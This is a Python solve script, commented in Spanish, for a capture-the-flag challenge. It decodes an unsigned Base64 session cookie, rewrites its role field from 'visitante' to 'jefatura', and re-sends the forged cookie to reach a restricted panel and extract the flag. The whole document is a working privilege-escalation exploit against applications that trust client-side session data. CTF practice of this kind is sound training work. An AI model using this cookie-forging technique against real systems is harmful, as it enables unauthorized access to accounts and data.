#!/usr/bin/env python3
"""CDM CTF 2026-11-13 - Credencial digital del personal (203.0.113.10:8002)

Vulnerabilidad: la credencial de sesion (`sich_sesion`) no esta firmada ni
cifrada, solo codificada en Base64. El servidor confia en el campo `rol` que
trae el cliente, asi que se puede cambiar "visitante" por "jefatura".

Uso: python solve.py [host:puerto]
"""
from __future__ import annotations

import base64
import json
import re
import sys

import requests

BASE = "http://" + (sys.argv[1] if len(sys.argv) > 1 else "203.0.113.10:8002")
FLAG_RE = re.compile(r"cdm\{[^}]*\}")


def decodificar(valor: str) -> dict:
    valor += "=" * (-len(valor) % 4)
    return json.loads(base64.b64decode(valor))


def codificar(data: dict) -> str:
    return base64.b64encode(json.dumps(data).encode()).decode()


def main() -> int:
    s = requests.Session()

    # 1) Credencial legitima de visitante
    s.post(f"{BASE}/", data={"usuario": "juan"}, timeout=15)
    original = s.cookies.get("sich_sesion", "")
    credencial = decodificar(original)
    print(f"[*] credencial emitida: {credencial}")

    # 2) El campo `rol` es editable: firmar no hace falta
    restringido = s.get(f"{BASE}/panel", timeout=15).text
    print(f"[*] /panel como '{credencial.get('rol')}': "
          f"{'flag' if FLAG_RE.search(restringido) else 'acceso restringido'}")

    credencial["rol"] = "jefatura"
    forjada = codificar(credencial)
    print(f"[*] credencial forjada: {forjada}")

    # 3) Reclamar el expediente clasificado
    #    OJO: hay que reemplazar el cookie del jar; si se envia como `cookies=`
    #    junto al legitimo, requests manda ambos y el servidor toma el primero.
    s.cookies.clear()
    s.cookies.set("sich_sesion", forjada)
    r = s.get(f"{BASE}/panel", timeout=15)
    m = FLAG_RE.search(r.text)
    if not m:
        print("[-] el panel no entrego el expediente")
        return 1
    flag = m.group(0)
    print(f"[+] FLAG: {flag}")
    with open("flag.txt", "w", encoding="utf-8") as fh:
        fh.write(flag + "\n")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
